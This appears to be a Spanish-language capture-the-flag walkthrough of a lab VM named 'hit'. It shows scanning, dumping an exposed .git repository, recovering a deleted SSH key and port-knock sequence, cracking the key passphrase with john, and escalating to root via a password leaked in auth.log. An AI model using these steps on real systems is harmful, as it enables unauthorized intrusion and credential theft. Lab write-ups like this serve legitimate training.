@@ -1,0 +1,137 @@
+Identificamos la IP de la máquina víctima:
+❯ arp-scan --interface=wlo1 --localnet | grep PCS | awk '{print $1}'
+192.168.1.53
+
+Enumeramos puertos:
+❯ sudo nmap -p- -sS --min-rate 5000 -n -Pn -oG 01-allPorts 192.168.1.53
+[sudo] contraseña para wh01s17: 
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-08 14:40 -0400
+Nmap scan report for 192.168.1.53
+Host is up (0.00012s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 08:00:27:07:1B:F1 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.98 seconds
+
+❯ nmap -sCV -p 80 -oN 02-targeted.txt 192.168.1.53
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-08 14:40 -0400
+Nmap scan report for 192.168.1.53
+Host is up (0.00033s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.22.1
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.22.1
+| http-git: 
+|   192.168.1.53:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: Commit #5 
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
+
+Encontramos un repositorio disponible.
+
+Descargamos el repositorio con la herramienta git-dumper:
+❯ git-dumper "http://192.168.1.53/.git" ./git 
+
+Listamos y filtramos los commit para ver su contenido:
+❯ git log --oneline
+2b5a747 (HEAD -> master) Commit #5
+7dff168 Commit #4
+a998093 Commit #3
+0cf5be4 Commit #2
+9ca5eed Commit #1
+
+❯ git log --oneline | awk '{print $1}' | xargs git show 
+...
+------BEGIN OPENSSH PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,3E2B3558346EF63A
+...
+------END OPENSSH PRIVATE KEY-----
+
+...
+diff --git a/knockd.conf b/knockd.conf
+index 3036160..5ce5fff 100644
+--- a/knockd.conf
++++ b/knockd.conf
+@@ -1,8 +1,20 @@
+ [options]
+-       LogFile = /var/log/knockd.log
++       UseSyslog
+ 
+ [openSSH]
+-       sequence    = 65535,8888,54111
+-       seq_timeout = 1
+-       command     = /usr/sbin/service ssh start
+
+
+Descubrimos que ha sido eliminada una id_rsa y una configuración, que habilita ssh al hacer knock en unos puertos.
+
+Realizamos knock en los puertos:
+❯ knock -v 192.168.1.53 65535 8888 54111
+hitting tcp 192.168.1.53:65535
+hitting tcp 192.168.1.53:8888
+hitting tcp 192.168.1.53:54111 
+
+Volvemos a escanear los puertos:
+❯ sudo nmap -p- -sS --min-rate 5000 -n -Pn -oG 03-allPorts-knock 192.168.1.53
+[sudo] contraseña para wh01s17: 
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-08-08 15:03 -0400
+Nmap scan report for 192.168.1.53
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:07:1B:F1 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.95 seconds
+
+Intentamos conectarnos con el usuario charlie y la id_rsa, pero nos solicita el passphrase.
+
+Crackeamos con john:
+❯ ssh2john.py id_rsa_charlie > hash
+❯ john -w=/home/wh01s17/Documentos/wordlists/rockyou.txt hash
+...
+charlie1         (id_rsa_charlie)
+...
+
+Nos logueamos como el usuario charlie y obtenemos la primera flag:
+❯ ssh charlie@192.168.1.53 -i id_rsa_charlie
+Enter passphrase for key 'id_rsa_charlie': charlie1
+charlie@hit:~$
+
+Para escalar privilegios, ejecutamos el comando id para verificar los grupos a los que pertenece el usuario:
+charlie@hit:~$ id
+uid=1000(charlie) gid=1000(charlie) grupos=1000(charlie),4(adm)
+
+Pertenecemos al grupo adm, el cuál, nos permite tener acceso a los logs alojados en /var/log:
+charlie@hit:~$ find / -group adm 2>/dev/null
+/var/log/nginx
+/var/log/auth.log
+/var/log/kern.log
+/var/log/knockd.log
+/var/log/cron.log
+/var/log/syslog
+/var/log/apt/term.log
+/var/log/apt/term.log.1.gz
+
+Verificamos auth.log:
+charlie@hit:~$ cat /var/log/auth.log | grep password
+...
+2025-02-03T09:51:01.010590+01:00 hit sshd[701]: Failed password for invalid user r00tP4zzw0rd from 192.168.1.10 port 45796 ssh2 
+...
+
+Utilizamos la contraseña filtrada para loguearnos como root:
+charlie@hit:~$ su root
+Contraseña: r00tP4zzw0rd
+
+root@hit:/home/charlie#
+
+Obtenemos la flag y fin.
+
